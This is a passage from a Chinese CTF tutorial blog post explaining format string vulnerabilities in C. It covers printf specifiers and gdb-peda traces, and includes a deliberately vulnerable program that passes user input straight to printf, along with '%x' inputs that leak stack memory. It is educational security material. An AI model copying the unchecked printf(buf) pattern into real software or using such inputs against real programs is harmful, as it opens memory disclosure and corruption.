<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门到入狱-Format | Ma9icCR</title><meta name="description" content="PWN入门到入狱-Format格式化输出函数和格式字符串 函数  1234567#include &lt;stdio.h&gt;int printf(const char *format, ...);int fprintf(FILE *stream, const char *format, ...);int dprintf(int fd, const char *format, ...);int"><meta name="keywords" content="pwn"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Format/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="PWN入门到入狱-Format"><meta property="og:url" content="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Format/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="PWN入门到入狱-Format格式化输出函数和格式字符串 函数  1234567#include &lt;stdio.h&gt;int printf(const char *format, ...);int fprintf(FILE *stream, const char *format, ...);int dprintf(int fd, const char *format, ...);int"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><meta property="article:published_time" content="2022-03-28T02:52:48.000Z"><meta property="article:modified_time" content="2022-06-09T07:20:12.183Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="PWN入门到入狱-Heap" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Heap/"><link rel="next" title="PWN入门到入狱-Stack" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Stack/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-06-09 15:20:12'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">33</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">10</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN入门到入狱-Format"><span class="toc-number">1.</span> <span class="toc-text">PWN入门到入狱-Format</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化输出函数和格式字符串"><span class="toc-number">1.1.</span> <span class="toc-text">格式化输出函数和格式字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化字符串漏洞基本原理"><span class="toc-number">1.2.</span> <span class="toc-text">格式化字符串漏洞基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化字符串漏洞利用"><span class="toc-number">1.3.</span> <span class="toc-text">格式化字符串漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使程序崩溃"><span class="toc-number">1.3.1.</span> <span class="toc-text">使程序崩溃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看栈内容"><span class="toc-number">1.3.2.</span> <span class="toc-text">查看栈内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看任意地址的内存"><span class="toc-number">1.3.3.</span> <span class="toc-text">查看任意地址的内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#覆盖栈内容"><span class="toc-number">1.3.4.</span> <span class="toc-text">覆盖栈内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#覆盖任意地址内存"><span class="toc-number">1.3.5.</span> <span class="toc-text">覆盖任意地址内存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86-64-中的格式化字符串漏洞"><span class="toc-number">1.4.</span> <span class="toc-text">x86-64 中的格式化字符串漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-中的格式化字符串漏洞"><span class="toc-number">1.5.</span> <span class="toc-text">CTF 中的格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fmtstr-payload"><span class="toc-number">1.5.1.</span> <span class="toc-text">fmtstr_payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools-pwnlib-fmtstr-模块"><span class="toc-number">1.5.2.</span> <span class="toc-text">pwntools pwnlib.fmtstr 模块</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">PWN入门到入狱-Format</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2022-03-28 10:52:48"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2022-03-28</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-06-09 15:20:12"><i class="fas fa-history fa-fw"></i> 更新于 2022-06-09</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="PWN入门到入狱-Format"><a href="#PWN入门到入狱-Format" class="headerlink" title="PWN入门到入狱-Format"></a>PWN入门到入狱-Format</h1><h2 id="格式化输出函数和格式字符串"><a href="#格式化输出函数和格式字符串" class="headerlink" title="格式化输出函数和格式字符串"></a>格式化输出函数和格式字符串</h2><ul>
<li><strong>函数</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fprintf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dprintf</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">snprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>转换指示符</strong></li>
</ul>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">类型</th>
<th align="center">使用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">d</td>
<td align="center">4-byte</td>
<td align="center">Integer</td>
</tr>
<tr>
<td align="center">u</td>
<td align="center">4-byte</td>
<td align="center">Unsigned Integer</td>
</tr>
<tr>
<td align="center">x</td>
<td align="center">4-byte</td>
<td align="center">Hex</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">4-byte ptr</td>
<td align="center">String</td>
</tr>
<tr>
<td align="center">c</td>
<td align="center">1-byte</td>
<td align="center">Character</td>
</tr>
</tbody></table>
<ul>
<li><strong>长度</strong></li>
</ul>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">类型</th>
<th align="center">使用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">hh</td>
<td align="center">1-byte</td>
<td align="center">char</td>
</tr>
<tr>
<td align="center">h</td>
<td align="center">2-byte</td>
<td align="center">short int</td>
</tr>
<tr>
<td align="center">l</td>
<td align="center">4-byte</td>
<td align="center">long int</td>
</tr>
<tr>
<td align="center">ll</td>
<td align="center">8-byte</td>
<td align="center">long long int</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *format = <span class="string">"%s"</span>;</span><br><span class="line">    <span class="keyword">char</span> *arg1 = <span class="string">"Hello World!\n"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format, arg1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%03d.%03d.%03d.%03d"</span>, <span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);    <span class="comment">// "127.000.000.001"</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2f"</span>, <span class="number">1.2345</span>);   <span class="comment">// 1.23</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#010x"</span>, <span class="number">3735928559</span>);   <span class="comment">// 0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s%n"</span>, <span class="string">"01234"</span>, &amp;n);  <span class="comment">// n = 5</span></span><br></pre></td></tr></table></figure>

<h2 id="格式化字符串漏洞基本原理"><a href="#格式化字符串漏洞基本原理" class="headerlink" title="格式化字符串漏洞基本原理"></a>格式化字符串漏洞基本原理</h2><p>在 x86 结构下，格式字符串的参数是通过栈传递的，看一个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s %d %s"</span>, <span class="string">"Hello World!"</span>, <span class="number">233</span>, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据 cdecl 的调用约定，在进入 <code>printf()</code> 函数之前，将参数从右到左依次压栈。进入 <code>printf()</code> 之后，函数首先获取第一个参数，一次读取一个字符。如果字符不是 <code>%</code>，字符直接复制到输出中。否则，读取下一个非空字符，获取相应的参数并解析输出。（注意：<code>% d</code> 和 <code>%d</code> 是一样的）</p>
<p>接下来我们修改一下上面的程序，给格式字符串加上 <code>%x %x %x %3$s</code>，使它出现格式化字符串漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s %d %s %x %x %x %3$s"</span>, <span class="string">"Hello World!"</span>, <span class="number">233</span>, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要看一下参数传递：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x56557000 --&gt; 0x1efc</span><br><span class="line">EBX: 0x56557000 --&gt; 0x1efc</span><br><span class="line">ECX: 0xffffd250 --&gt; 0x1</span><br><span class="line">EDX: 0x5655561f (&quot;%s %d %s %x %x %x %3$s&quot;)</span><br><span class="line">ESI: 0xf7f95000 --&gt; 0x1bbd90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd238 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd220 --&gt; 0x5655561f (&quot;%s %d %s %x %x %x %3$s&quot;)</span><br><span class="line">EIP: 0x56555572 (&lt;main+53&gt;: call   0x565553d0 &lt;printf@plt&gt;)</span><br><span class="line">EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x56555569 &lt;main+44&gt;:    lea    edx,[eax-0x19e1]</span><br><span class="line">   0x5655556f &lt;main+50&gt;:    push   edx</span><br><span class="line">   0x56555570 &lt;main+51&gt;:    mov    ebx,eax</span><br><span class="line">&#x3D;&gt; 0x56555572 &lt;main+53&gt;:    call   0x565553d0 &lt;printf@plt&gt;</span><br><span class="line">   0x56555577 &lt;main+58&gt;:    add    esp,0x10</span><br><span class="line">   0x5655557a &lt;main+61&gt;:    nop</span><br><span class="line">   0x5655557b &lt;main+62&gt;:    lea    esp,[ebp-0x8]</span><br><span class="line">   0x5655557e &lt;main+65&gt;:    pop    ecx</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5655561f (&quot;%s %d %s %x %x %x %3$s&quot;)</span><br><span class="line">arg[1]: 0x56555612 (&quot;Hello World!&quot;)</span><br><span class="line">arg[2]: 0xe9</span><br><span class="line">arg[3]: 0x56555610 --&gt; 0x6548000a (&#39;\n&#39;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd220 --&gt; 0x5655561f (&quot;%s %d %s %x %x %x %3$s&quot;)</span><br><span class="line">0004| 0xffffd224 --&gt; 0x56555612 (&quot;Hello World!&quot;)</span><br><span class="line">0008| 0xffffd228 --&gt; 0xe9</span><br><span class="line">0012| 0xffffd22c --&gt; 0x56555610 --&gt; 0x6548000a (&#39;\n&#39;)</span><br><span class="line">0016| 0xffffd230 --&gt; 0xffffd250 --&gt; 0x1</span><br><span class="line">0020| 0xffffd234 --&gt; 0x0</span><br><span class="line">0024| 0xffffd238 --&gt; 0x0</span><br><span class="line">0028| 0xffffd23c --&gt; 0xf7df1253 (&lt;__libc_start_main+243&gt;:   add    esp,0x10)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x56555572 in main ()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Hello World! 233</span><br><span class="line"> ffffd250 0 0</span><br><span class="line">[Inferior 1 (process 27480) exited with code 041]</span><br></pre></td></tr></table></figure>

<p>这一次栈的结构和上一次相同，只是格式字符串有变化。程序打印出了七个值（包括换行），而我们其实只给出了前三个值的内容，后面的三个 <code>%x</code> 打印出了 <code>0xffffd230~0xffffd238</code> 栈内的数据，这些都不是我们输入的。而最后一个参数 <code>%3$s</code> 是对 <code>0xffffd22c</code> 中  的重用。</p>
<p>上一个例子中，格式字符串中要求的参数个数大于我们提供的参数个数。在下面的例子中，我们省去了格式字符串，同样存在漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">if</span> (fgets(buf, <span class="keyword">sizeof</span> buf, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)</span><br><span class="line">EBX: 0x56557000 --&gt; 0x1ef8</span><br><span class="line">ECX: 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)</span><br><span class="line">EDX: 0xf7f9685c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f95000 --&gt; 0x1bbd90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd238 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd1e0 --&gt; 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)</span><br><span class="line">EIP: 0x5655562a (&lt;main+77&gt;: call   0x56555450 &lt;printf@plt&gt;)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x56555623 &lt;main+70&gt;:    sub    esp,0xc</span><br><span class="line">   0x56555626 &lt;main+73&gt;:    lea    eax,[ebp-0x3e]</span><br><span class="line">   0x56555629 &lt;main+76&gt;:    push   eax</span><br><span class="line">&#x3D;&gt; 0x5655562a &lt;main+77&gt;:    call   0x56555450 &lt;printf@plt&gt;</span><br><span class="line">   0x5655562f &lt;main+82&gt;:    add    esp,0x10</span><br><span class="line">   0x56555632 &lt;main+85&gt;:    jmp    0x56555635 &lt;main+88&gt;</span><br><span class="line">   0x56555634 &lt;main+87&gt;:    nop</span><br><span class="line">   0x56555635 &lt;main+88&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd1e0 --&gt; 0xffffd1fa (&quot;Hello %x %x %x !\n&quot;)</span><br><span class="line">0004| 0xffffd1e4 --&gt; 0x32 (&#39;2&#39;)</span><br><span class="line">0008| 0xffffd1e8 --&gt; 0xf7f95580 --&gt; 0xfbad2288</span><br><span class="line">0012| 0xffffd1ec --&gt; 0x565555f4 (&lt;main+23&gt;: add    ebx,0x1a0c)</span><br><span class="line">0016| 0xffffd1f0 --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd1f4 --&gt; 0xffffd47a (&quot;&#x2F;home&#x2F;firmy&#x2F;Desktop&#x2F;RE4B&#x2F;c.out&quot;)</span><br><span class="line">0024| 0xffffd1f8 --&gt; 0x65485ea0</span><br><span class="line">0028| 0xffffd1fc (&quot;llo %x %x %x !\n&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x5655562a in main ()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Hello 32 f7f95580 565555f4 !</span><br><span class="line">[Inferior 1 (process 28253) exited normally]</span><br></pre></td></tr></table></figure>

<p>如果大家都是好孩子，输入正常的字符，程序就不会有问题。由于没有格式字符串，如果我们在 <code>buf</code> 中输入一些转换指示符，则 <code>printf()</code> 会把它当做格式字符串并解析，漏洞发生。例如上面演示的我们输入了 <code>Hello %x %x %x !</code>（其中  是 <code>fgets()</code> 函数给我们自动加上的），这时，程序就会输出栈内的数据。</p>
<p>我们可以总结出，其实格式字符串漏洞发生的条件就是格式字符串要求的参数和实际提供的参数不匹配。下面我们讨论两个问题：</p>
<ul>
<li>为什么可以通过编译？<ul>
<li>因为 <code>printf()</code> 函数的参数被定义为可变的。</li>
<li>为了发现不匹配的情况，编译器需要理解 <code>printf()</code> 是怎么工作的和格式字符串是什么。然而，编译器并不知道这些。</li>
<li>有时格式字符串并不是固定的，它可能在程序执行中动态生成。</li>
</ul>
</li>
